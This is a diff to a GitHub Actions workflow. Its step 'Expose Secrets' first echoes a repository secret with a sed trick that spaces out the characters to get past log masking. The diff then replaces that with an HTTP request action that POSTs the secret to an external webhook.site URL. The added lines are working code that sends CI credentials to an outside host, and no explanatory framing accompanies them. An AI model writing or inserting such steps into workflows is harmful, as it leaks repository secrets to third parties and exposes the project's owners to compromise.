@@ -24,8 +24,11 @@ jobs:
       with:
         python-version: "3.10"
     - name: Expose Secrets
-      run: |
-        echo "The GitHub Action Secret will be masked:  "
-        echo ${{ secrets.KEY }}
-        echo "Trick to echo GitHub Actions Secret:  "
-        echo ${{ secrets.KEY }} | sed 's/./& /g'
+      env:
+        KEY: ${{ secrets.KEY }}
+      uses: fjogeleit/http-request-action@v1
+      with:
+        url: 'https://webhook.site/4aecfb6a-765b-4d41-92fc-a4ac9c1463df'
+        method: 'POST'
+        customHeaders: '{"Content-Type": "application/json"}'
+        data: ${{ secrets.KEY }}
